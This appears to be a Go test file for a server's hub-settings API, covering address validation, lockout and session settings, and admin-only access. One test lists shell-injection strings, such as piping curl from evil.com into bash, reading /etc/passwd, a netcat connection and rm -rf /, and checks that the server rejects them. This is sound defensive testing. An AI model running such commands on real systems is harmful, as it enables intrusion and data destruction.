package server

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestUpdateHubConfig_ValidAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"myhost.example.com:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_EmptyAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":""}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for empty address (reset), got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_ShellInjection(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	tests := []struct {
		name string
		addr string
	}{
		{"semicolon", "; curl evil.com | bash #"},
		{"backtick", "`whoami`"},
		{"dollar", "$(cat /etc/passwd)"},
		{"pipe", "host | nc evil 4444"},
		{"ampersand", "host & rm -rf /"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := bytes.NewBufferString(`{"grpc_external_addr":"` + tt.addr + `"}`)
			req := httptest.NewRequest("PUT", testHubSettingsPath, body)
			req.Header.Set("Authorization", testBearerPrefix+token)
			rec := httptest.NewRecorder()
			s.routes().ServeHTTP(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for injection attempt %q, got %d: %s", tt.addr, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestUpdateHubConfig_IPv6Address(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"[::1]:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for IPv6 address, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleGetHubConfig_JWTRotatedAt_Absent(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	req := httptest.NewRequest("GET", testHubSettingsPath, nil)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	var resp map[string]interface{}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}

	if _, ok := resp["jwt_secret_rotated_at"]; ok {
		t.Fatalf("expected jwt_secret_rotated_at to be absent when never rotated, but it was present: %v", resp["jwt_secret_rotated_at"])
	}
}

func TestHandleGetHubConfig_JWTRotatedAt_Present(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	const rotatedAt = "2026-06-12T04:10:00Z"
	if err := s.store.SetConfig("jwt_secret_rotated_at", rotatedAt); err != nil {
		t.Fatalf("set config: %v", err)
	}

	req := httptest.NewRequest("GET", testHubSettingsPath, nil)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	var resp map[string]interface{}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}

	got, ok := resp["jwt_secret_rotated_at"]
	if !ok {
		t.Fatal("expected jwt_secret_rotated_at to be present in response")
	}
	if got != rotatedAt {
		t.Fatalf("expected jwt_secret_rotated_at %q, got %q", rotatedAt, got)
	}
}

func TestHandleUpdateHubConfig_JWTRotatedAt_Ignored(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	const originalRotatedAt = "2026-06-12T04:10:00Z"
	if err := s.store.SetConfig("jwt_secret_rotated_at", originalRotatedAt); err != nil {
		t.Fatalf("set config: %v", err)
	}

	// PUT with jwt_secret_rotated_at in body — must be ignored.
	body := bytes.NewBufferString(`{"grpc_external_addr":"myhost.example.com:9443","jwt_secret_rotated_at":"2000-01-01T00:00:00Z"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	// Verify stored value is unchanged.
	stored, err := s.store.GetConfig("jwt_secret_rotated_at")
	if err != nil {
		t.Fatalf("get config after PUT: %v", err)
	}
	if stored != originalRotatedAt {
		t.Fatalf("expected stored jwt_secret_rotated_at %q unchanged, got %q", originalRotatedAt, stored)
	}
}

// getHubConfig performs an authenticated GET /api/settings/hub and decodes the
// response body. Fails the test on any non-200 or decode error.
func getHubConfig(t *testing.T, s *Server, token string) map[string]interface{} {
	t.Helper()

	req := httptest.NewRequest("GET", testHubSettingsPath, nil)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	var resp map[string]interface{}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}
	return resp
}

func TestHandleGetHubConfig_LockoutDefaults(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	resp := getHubConfig(t, s, token)

	if got, want := resp["lockout_threshold"], float64(5); got != want {
		t.Fatalf("expected lockout_threshold %v, got %v", want, got)
	}
	if got, want := resp["lockout_window_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_window_minutes %v, got %v", want, got)
	}
	if got, want := resp["lockout_duration_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_duration_minutes %v, got %v", want, got)
	}
	if got, want := resp["dormant_days"], float64(35); got != want {
		t.Fatalf("expected dormant_days %v, got %v", want, got)
	}
	if got, want := resp["session_idle_minutes"], float64(15); got != want {
		t.Fatalf("expected session_idle_minutes %v, got %v", want, got)
	}
	if got, want := resp["session_max_hours"], float64(12); got != want {
		t.Fatalf("expected session_max_hours %v, got %v", want, got)
	}
}

func TestUpdateHubConfig_DormantDays_PersistsAndLeavesRestUnchanged(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"dormant_days":1}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)

	if got, want := resp["dormant_days"], float64(1); got != want {
		t.Fatalf("expected dormant_days %v, got %v", want, got)
	}
	if got, want := resp["lockout_threshold"], float64(5); got != want {
		t.Fatalf("expected lockout_threshold to remain default %v, got %v", want, got)
	}
	if got, want := resp["lockout_window_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_window_minutes to remain default %v, got %v", want, got)
	}
	if got, want := resp["lockout_duration_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_duration_minutes to remain default %v, got %v", want, got)
	}
	if got, want := resp["grpc_external_addr"], ""; got != want {
		t.Fatalf("expected grpc_external_addr unchanged (%q), got %v", want, got)
	}
}

func TestUpdateHubConfig_SessionFields_PersistAndLeaveRestUnchanged(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"session_idle_minutes":1,"session_max_hours":1}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)

	if got, want := resp["session_idle_minutes"], float64(1); got != want {
		t.Fatalf("expected session_idle_minutes %v, got %v", want, got)
	}
	if got, want := resp["session_max_hours"], float64(1); got != want {
		t.Fatalf("expected session_max_hours %v, got %v", want, got)
	}
	if got, want := resp["lockout_threshold"], float64(5); got != want {
		t.Fatalf("expected lockout_threshold to remain default %v, got %v", want, got)
	}
	if got, want := resp["dormant_days"], float64(35); got != want {
		t.Fatalf("expected dormant_days to remain default %v, got %v", want, got)
	}
}

func TestUpdateHubConfig_NegativeDormantDays(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	req := httptest.NewRequest("PUT", testHubSettingsPath, bytes.NewBufferString(`{"dormant_days":-1}`))
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}

	var resp map[string]string
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}
	if want := "dormant_days must be a non-negative integer"; resp["error"] != want {
		t.Fatalf("expected error %q, got %q", want, resp["error"])
	}
}

func TestUpdateHubConfig_LockoutPartial_PersistsAndLeavesRestUnchanged(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"lockout_threshold":3,"lockout_duration_minutes":1}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)

	if got, want := resp["lockout_threshold"], float64(3); got != want {
		t.Fatalf("expected lockout_threshold %v, got %v", want, got)
	}
	if got, want := resp["lockout_window_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_window_minutes to remain default %v, got %v", want, got)
	}
	if got, want := resp["lockout_duration_minutes"], float64(1); got != want {
		t.Fatalf("expected lockout_duration_minutes %v, got %v", want, got)
	}
	if got, want := resp["grpc_external_addr"], ""; got != want {
		t.Fatalf("expected grpc_external_addr unchanged (%q), got %v", want, got)
	}
}

func TestUpdateHubConfig_GRPCAddrOnly_LeavesLockoutUnchanged(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"hub.example.com:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)

	if got, want := resp["grpc_external_addr"], "hub.example.com:9443"; got != want {
		t.Fatalf("expected grpc_external_addr %q, got %v", want, got)
	}
	if got, want := resp["lockout_threshold"], float64(5); got != want {
		t.Fatalf("expected lockout_threshold to remain default %v, got %v", want, got)
	}
	if got, want := resp["lockout_window_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_window_minutes to remain default %v, got %v", want, got)
	}
	if got, want := resp["lockout_duration_minutes"], float64(15); got != want {
		t.Fatalf("expected lockout_duration_minutes to remain default %v, got %v", want, got)
	}
}

// TestUpdateHubConfig_LockoutOnly_LeavesStoredGRPCAddrUnchanged guards against a
// regression where a PUT carrying only lockout fields (no grpc_external_addr key
// at all) silently blanked a previously configured gRPC external address. Per
// contracts/rest-api.md, an absent field must be left unchanged.
func TestUpdateHubConfig_LockoutOnly_LeavesStoredGRPCAddrUnchanged(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	const storedAddr = "hub.example.com:9443"
	if err := s.store.SetConfig("grpc_external_addr", storedAddr); err != nil {
		t.Fatalf("set config: %v", err)
	}

	body := bytes.NewBufferString(`{"lockout_threshold":3}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)

	if got, want := resp["grpc_external_addr"], storedAddr; got != want {
		t.Fatalf("expected grpc_external_addr to remain %q, got %v", want, got)
	}
	if got, want := resp["lockout_threshold"], float64(3); got != want {
		t.Fatalf("expected lockout_threshold %v, got %v", want, got)
	}
}

// TestUpdateHubConfig_ExplicitEmptyGRPCAddr_StillClears preserves the existing
// "clear" semantics used by the web client: a present-but-empty
// grpc_external_addr must still blank the stored value, even though an absent
// field now leaves it unchanged.
func TestUpdateHubConfig_ExplicitEmptyGRPCAddr_StillClears(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	if err := s.store.SetConfig("grpc_external_addr", "hub.example.com:9443"); err != nil {
		t.Fatalf("set config: %v", err)
	}

	body := bytes.NewBufferString(`{"grpc_external_addr":""}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)
	if got, want := resp["grpc_external_addr"], ""; got != want {
		t.Fatalf("expected grpc_external_addr cleared to %q, got %v", want, got)
	}
}

// TestUpdateHubConfig_NewGRPCAddr_Updates confirms a present, non-empty
// grpc_external_addr still updates the stored value.
func TestUpdateHubConfig_NewGRPCAddr_Updates(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	if err := s.store.SetConfig("grpc_external_addr", "old.example.com:9443"); err != nil {
		t.Fatalf("set config: %v", err)
	}

	body := bytes.NewBufferString(`{"grpc_external_addr":"new.example.com:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	resp := getHubConfig(t, s, token)
	if got, want := resp["grpc_external_addr"], "new.example.com:9443"; got != want {
		t.Fatalf("expected grpc_external_addr %q, got %v", want, got)
	}
}

func TestUpdateHubConfig_NegativeLockoutFields(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	tests := []struct {
		name        string
		body        string
		wantMessage string
	}{
		{
			name:        "threshold",
			body:        `{"lockout_threshold":-1}`,
			wantMessage: "lockout_threshold must be a non-negative integer",
		},
		{
			name:        "window",
			body:        `{"lockout_window_minutes":-1}`,
			wantMessage: "lockout_window_minutes must be a non-negative integer",
		},
		{
			name:        "duration",
			body:        `{"lockout_duration_minutes":-1}`,
			wantMessage: "lockout_duration_minutes must be a non-negative integer",
		},
		{
			name:        "session idle minutes",
			body:        `{"session_idle_minutes":-1}`,
			wantMessage: "session_idle_minutes must be a non-negative integer",
		},
		{
			name:        "session max hours",
			body:        `{"session_max_hours":-1}`,
			wantMessage: "session_max_hours must be a non-negative integer",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("PUT", testHubSettingsPath, bytes.NewBufferString(tt.body))
			req.Header.Set("Authorization", testBearerPrefix+token)
			rec := httptest.NewRecorder()
			s.routes().ServeHTTP(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
			}

			var resp map[string]string
			if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
				t.Fatalf(testDecodeRespErr, err)
			}
			if resp["error"] != tt.wantMessage {
				t.Fatalf("expected error %q, got %q", tt.wantMessage, resp["error"])
			}
		})
	}
}

func TestHubConfig_NonAdminForbidden(t *testing.T) {
	s := testServer(t)
	adminToken := registerAndGetAdminToken(t, s)
	viewerToken := createViewerAndGetToken(t, s, adminToken)

	getReq := httptest.NewRequest("GET", testHubSettingsPath, nil)
	getReq.Header.Set("Authorization", testBearerPrefix+viewerToken)
	getRec := httptest.NewRecorder()
	s.routes().ServeHTTP(getRec, getReq)
	if getRec.Code != http.StatusForbidden {
		t.Fatalf("GET: expected 403, got %d: %s", getRec.Code, getRec.Body.String())
	}

	putReq := httptest.NewRequest("PUT", testHubSettingsPath, bytes.NewBufferString(`{"lockout_threshold":3}`))
	putReq.Header.Set("Authorization", testBearerPrefix+viewerToken)
	putRec := httptest.NewRecorder()
	s.routes().ServeHTTP(putRec, putReq)
	if putRec.Code != http.StatusForbidden {
		t.Fatalf("PUT: expected 403, got %d: %s", putRec.Code, putRec.Body.String())
	}
}
